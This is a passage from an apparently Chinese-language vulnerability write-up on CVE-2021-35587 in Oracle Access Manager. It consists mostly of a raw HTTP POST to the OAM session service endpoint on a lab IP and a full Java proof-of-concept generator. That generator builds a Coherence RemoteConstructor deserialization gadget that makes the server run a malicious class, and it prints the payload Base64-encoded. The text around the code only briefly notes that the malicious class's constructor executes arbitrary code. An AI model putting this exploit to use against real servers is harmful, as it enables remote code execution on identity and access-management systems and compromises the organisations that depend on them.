</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-91-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-91-20>20</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-html data-lang=html><span style=display:flex><span>POST /oam/server/opensso/sessionservice HTTP/1.1
</span></span><span style=display:flex><span>Host: 192.168.175.139:14100
</span></span><span style=display:flex><span>Upgrade-Insecure-Requests: 1
</span></span><span style=display:flex><span>User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36
</span></span><span style=display:flex><span>Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
</span></span><span style=display:flex><span>Accept-Encoding: gzip, deflate
</span></span><span style=display:flex><span>Accept-Language: zh-CN,zh;q=0.9
</span></span><span style=display:flex><span>Connection: close
</span></span><span style=display:flex><span>Content-Type: text/xml
</span></span><span style=display:flex><span>Content-Length: 289
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34; standalone=&#34;yes&#34;?&gt;</span>
</span></span><span style=display:flex><span>&lt;<span style=color:#f92672>RequestSet</span> <span style=color:#a6e22e>vers</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;vers123&#34;</span> <span style=color:#a6e22e>svcid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;session&#34;</span> <span style=color:#a6e22e>reqid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;req_1&#34;</span>&gt;
</span></span><span style=display:flex><span> &lt;<span style=color:#f92672>Request</span> <span style=color:#a6e22e>dtdid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;dtd1&#34;</span> <span style=color:#a6e22e>sid</span><span style=color:#f92672>=</span><span style=color:#e6db74>&#34;sid1&#34;</span>&gt;<span style=color:#75715e>&lt;![CDATA[
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;authIdentifier reqid=&#34;1&#34; requester=&#34;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#34;&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;SessionID&gt;123&lt;/SessionID&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	&lt;/authIdentifier&gt;
</span></span></span><span style=display:flex><span><span style=color:#75715e>	]]&gt;</span>
</span></span><span style=display:flex><span> &lt;/<span style=color:#f92672>Request</span>&gt;
</span></span><span style=display:flex><span>&lt;/<span style=color:#f92672>RequestSet</span>&gt;
</span></span></code></pre></td></tr></table></div></div><p>其中作为参数传入cve_2021_35587()方法的类即用于在反序列化的最终环节构建恶意对象，我们在诸如rev.class这样的恶意类的构造函数中执行恶意代码。</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-1><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-1> 1</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-2><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-2> 2</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-3><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-3> 3</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-4><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-4> 4</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-5><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-5> 5</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-6><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-6> 6</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-7><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-7> 7</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-8><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-8> 8</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-9><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-9> 9</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-10><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-10>10</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-11><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-11>11</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-12><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-12>12</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-13><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-13>13</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-14><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-14>14</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-15><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-15>15</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-16><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-16>16</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-17><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-17>17</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-18><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-18>18</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-19><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-19>19</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-20><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-20>20</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-21><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-21>21</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-22><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-22>22</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-23><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-23>23</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-24><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-24>24</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-25><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-25>25</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-26><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-26>26</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-27><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-27>27</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-28><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-28>28</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-29><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-29>29</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-30><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-30>30</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-31><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-31>31</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-32><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-32>32</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-33><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-33>33</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-34><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-34>34</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-35><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-35>35</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-36><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-36>36</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-37><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-37>37</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-38><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-38>38</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-39><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-39>39</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-40><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-40>40</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-41><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-41>41</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-42><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-42>42</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-43><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-43>43</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-44><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-44>44</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-45><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-45>45</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-46><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-46>46</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-47><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-47>47</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-48><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-48>48</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-49><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-49>49</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-50><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-50>50</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-51><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-51>51</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-52><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-52>52</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-53><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-53>53</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-54><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-54>54</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-55><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-55>55</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-56><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-56>56</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-57><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-57>57</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-58><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-58>58</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-59><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-59>59</a>
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f" id=hl-92-60><a style=outline:none;text-decoration:none;color:inherit href=#hl-92-60>60</a>
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#f92672>package</span> pers.neo<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.coherence.servlet.AttributeHolder<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassDefinition<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.ClassIdentity<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> com.tangosol.internal.util.invoke.RemoteConstructor<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.ClassPool<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> javassist.CtClass<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> oracle.security.am.proxy.opensso.session.utils.SessionID<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> weblogic.rmi.provider.BasicServiceContext<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.io.*<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.lang.reflect.Method<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.nio.charset.StandardCharsets<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span><span style=color:#f92672>import</span> java.util.Base64<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>class</span> <span style=color:#a6e22e>genpoc</span><span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>main</span><span style=color:#f92672>(</span>String<span style=color:#f92672>[]</span> args<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        cve_2021_35587<span style=color:#f92672>(</span>rev<span style=color:#f92672>.</span><span style=color:#a6e22e>class</span><span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>	<span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#66d9ef>void</span> <span style=color:#a6e22e>cve_2021_35587</span><span style=color:#f92672>(</span>Class poccls<span style=color:#f92672>)</span> <span style=color:#66d9ef>throws</span> Exception <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        ClassIdentity classIdentity <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ClassIdentity<span style=color:#f92672>(</span>poccls<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        ClassPool cp <span style=color:#f92672>=</span> ClassPool<span style=color:#f92672>.</span><span style=color:#a6e22e>getDefault</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        CtClass ctClass <span style=color:#f92672>=</span> cp<span style=color:#f92672>.</span><span style=color:#a6e22e>get</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>replaceClassName</span><span style=color:#f92672>(</span>poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>(),</span> poccls<span style=color:#f92672>.</span><span style=color:#a6e22e>getName</span><span style=color:#f92672>()</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#34;$&#34;</span> <span style=color:#f92672>+</span> classIdentity<span style=color:#f92672>.</span><span style=color:#a6e22e>getVersion</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        RemoteConstructor constructor <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> RemoteConstructor<span style=color:#f92672>(</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> ClassDefinition<span style=color:#f92672>(</span>classIdentity<span style=color:#f92672>,</span> ctClass<span style=color:#f92672>.</span><span style=color:#a6e22e>toBytecode</span><span style=color:#f92672>()),</span>
</span></span><span style=display:flex><span>                <span style=color:#66d9ef>new</span> Object<span style=color:#f92672>[]{}</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        <span style=color:#75715e>//这一环并非必要，可以简化
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//AttributeHolder attributeHolder=new AttributeHolder();
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//Method setInternalValue=attributeHolder.getClass().getDeclaredMethod(&#34;setInternalValue&#34;,Object.class);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//setInternalValue.setAccessible(true);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//setInternalValue.invoke(attributeHolder,constructor);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//BasicServiceContext basicServiceContext=new BasicServiceContext(1,attributeHolder);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        <span style=color:#75715e>//直接将constructor设置到basicServiceContext中
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>        BasicServiceContext basicServiceContext<span style=color:#f92672>=</span><span style=color:#66d9ef>new</span> BasicServiceContext<span style=color:#f92672>(</span><span style=color:#ae81ff>1</span><span style=color:#f92672>,</span>constructor<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>        System<span style=color:#f92672>.</span><span style=color:#a6e22e>out</span><span style=color:#f92672>.</span><span style=color:#a6e22e>println</span><span style=color:#f92672>(</span>oamserialize<span style=color:#f92672>(</span>basicServiceContext<span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Serializable<span style=color:#f92672>&gt;</span> String <span style=color:#a6e22e>oamserialize</span><span style=color:#f92672>(</span>T item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        String data<span style=color:#f92672>=</span>serialize<span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>((</span><span style=color:#e6db74>&#34;object:&#34;</span><span style=color:#f92672>+</span>data<span style=color:#f92672>).</span><span style=color:#a6e22e>getBytes</span><span style=color:#f92672>(</span>StandardCharsets<span style=color:#f92672>.</span><span style=color:#a6e22e>UTF_8</span><span style=color:#f92672>));</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>//   ref: https://gist.github.com/andy722/1524968
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>public</span> <span style=color:#66d9ef>static</span> <span style=color:#f92672>&lt;</span>T <span style=color:#66d9ef>extends</span> Serializable<span style=color:#f92672>&gt;</span> String <span style=color:#a6e22e>serialize</span><span style=color:#f92672>(</span>T item<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> ByteArrayOutputStream byteArrayOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ByteArrayOutputStream<span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>final</span> ObjectOutputStream objectOutputStream<span style=color:#f92672>;</span>
</span></span><span style=display:flex><span>        <span style=color:#66d9ef>try</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            objectOutputStream <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> ObjectOutputStream<span style=color:#f92672>(</span>byteArrayOutputStream<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            objectOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>writeObject</span><span style=color:#f92672>(</span>item<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>            objectOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>close</span><span style=color:#f92672>();</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> Base64<span style=color:#f92672>.</span><span style=color:#a6e22e>getEncoder</span><span style=color:#f92672>().</span><span style=color:#a6e22e>encodeToString</span><span style=color:#f92672>(</span>byteArrayOutputStream<span style=color:#f92672>.</span><span style=color:#a6e22e>toByteArray</span><span style=color:#f92672>());</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span> <span style=color:#66d9ef>catch</span> <span style=color:#f92672>(</span>IOException e<span style=color:#f92672>)</span> <span style=color:#f92672>{</span>
</span></span><span style=display:flex><span>            <span style=color:#66d9ef>throw</span> <span style=color:#66d9ef>new</span> Error<span style=color:#f92672>(</span>e<span style=color:#f92672>);</span>
</span></span><span style=display:flex><span>        <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span>    <span style=color:#f92672>}</span>
</span></span><span style=display:flex><span><span style=color:#f92672>}</span>
